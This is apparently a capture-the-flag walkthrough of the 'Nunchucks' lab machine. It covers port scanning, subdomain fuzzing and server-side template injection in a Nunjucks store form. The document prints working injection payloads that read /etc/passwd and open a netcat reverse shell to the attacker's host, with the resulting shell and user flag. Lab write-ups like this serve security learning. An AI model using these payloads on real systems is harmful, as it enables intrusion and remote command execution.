
### Tools: 

### Vulnerabilities: 

Nmap reveals 3 ports open, SSH, HTTP, and HTTPS. They give us the domain so lets add that to our hosts file.

```console
└─$ nmap -A -p- -T4 -Pn 10.129.95.252
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-18 15:12 CDT
Nmap scan report for 10.129.95.252
Host is up (0.079s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c146dbb7459c3782e48f511d85b4721 (RSA)
|   256 a2f42c427465a37c26dd497223827271 (ECDSA)
|_  256 e18d44e7216d7c132fea3b8358aa02b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.49 seconds
```
Feroxbuster gives a few things interesting things like the login page.

```console
└─$ feroxbuster -u https://nunchucks.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q -k
WLD      GET        3l        6w       45c Got 200 for https://nunchucks.htb/efd7c3c056164989a56670de5c928281 (url length: 32)
WLD      GET         -         -         - Wildcard response is static; auto-filtering 45 responses; toggle this behavior by using --dont-filter
WLD      GET        3l        6w       45c Got 200 for https://nunchucks.htb/5de72f6e1ba949ebb8cfd289964c9f0a464042bc5b6440818c6b4b702744caf88948eb8241f64d4086555180d4b75b7b (url length: 96)
200      GET      546l     2271w    30589c https://nunchucks.htb/
200      GET      183l      662w     9172c https://nunchucks.htb/login
301      GET       10l       16w      179c https://nunchucks.htb/assets => /assets/
301      GET       10l       16w      193c https://nunchucks.htb/assets/images => /assets/images/
301      GET       10l       16w      185c https://nunchucks.htb/assets/js => /assets/js/
301      GET       10l       16w      187c https://nunchucks.htb/assets/css => /assets/css/
200      GET      250l     1863w    19134c https://nunchucks.htb/privacy
200      GET      187l      683w     9488c https://nunchucks.htb/signup
200      GET      245l     1737w    17753c https://nunchucks.htb/terms
Scanning: https://nunchucks.htb
Scanning: https://nunchucks.htb/
Scanning: https://nunchucks.htb/assets
Scanning: https://nunchucks.htb/assets/images
Scanning: https://nunchucks.htb/assets/js
Scanning: https://nunchucks.htb/assets/css
```
Checking out the terms and privacy pages we get a bunch of hints about a possible template injection. Looking more into it the firefox extension wappalyzer tells me NodeJS is running. Also looking up some SSTI on Hacktricks says that Nunjucks is running on SSTI! The fact that the box's name was Nunchucks means there is a really good chance this is the attack vector. However I was not able to find any vulnerabilties on this webpage. So lets fuzz for some more.












Running wfuzz we are finally able to locate another domain!

```console
└─$ wfuzz -c -H "Host: FUZZ.nunchucks.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hw 2271 https://nunchucks.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nunchucks.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000000037:   200        101 L    259 W      4028 Ch     "store"                                                                                     
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 5.600609
Processed Requests: 197
Filtered Requests: 196
Requests/sec.: 35.17474
```

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks

```
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=2Zc7PPzLntxukEPB3DAKztkS
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Origin: https://store.nunchucks.htb
Content-Length: 19
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"email":"{{7*7}}"}
```
In order for this payload to work I had to use \ to escape the "", otherwise the payload wouldnt work and URL encoding had no effect.

```
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=2Zc7PPzLntxukEPB3DAKztkS
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Origin: https://store.nunchucks.htb
Content-Length: 127
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat  /etc/passwd')\")()}}"}
```

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 18 Oct 2022 21:50:58 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 2550
Connection: close
X-Powered-By: Express
ETag: W/"9f6-FbxVBWED1/U+Hb55hF5G8o+ReWw"

{"response":"You will receive updates on the following email address: root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\ndavid:x:1000:1000:david:/home/david:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nrtkit:x:113:117:RealtimeKit,,,:/proc:/usr/sbin/nologin\ndnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\ngeoclue:x:115:120::/var/lib/geoclue:/usr/sbin/nologin\navahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\ncups-pk-helper:x:117:123:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin\nsaned:x:118:124::/var/lib/saned:/usr/sbin/nologin\ncolord:x:119:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\npulse:x:120:126:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\nmysql:x:121:128:MySQL Server,,,:/nonexistent:/bin/false\n."}
```
```
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=2Zc7PPzLntxukEPB3DAKztkS
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://store.nunchucks.htb/
Content-Type: application/json
Origin: https://store.nunchucks.htb
Content-Length: 150
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.16 1234 >/tmp/f')\")()}}"}
```
```console
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.16] from (UNKNOWN) [10.129.95.252] 59850
sh: 0: can't access tty; job control turned off
$ id
uid=1000(david) gid=1000(david) groups=1000(david)
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
david@nunchucks:/var/www/store.nunchucks$ 
```
```console
david@nunchucks:~$ cat user.txt
cat user.txt
3c82****************************
```
